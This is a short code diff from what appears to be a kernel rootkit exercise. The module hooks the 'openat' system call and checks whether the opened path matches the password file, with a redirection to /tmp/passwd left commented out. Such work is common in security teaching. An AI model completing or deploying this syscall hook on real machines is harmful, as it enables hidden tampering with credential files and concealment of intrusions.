@@ -53,12 +53,11 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
-  // unsigned long path_addr = regs->di;
-  // char * pathname = (char *)path_addr;
-  // if (strcmp(pathname, PASSWD) == 0) {
-  // copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd"));
-  // printk(KERN_INFO "find real passwd");
-  // }
+  unsigned long path_addr = regs->si;
+  char * pathname = (char *)path_addr;
+  if (strcmp(pathname, PASSWD) == 0) {
+    // copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
+  }
   return (*original_openat)(regs);
 }
 
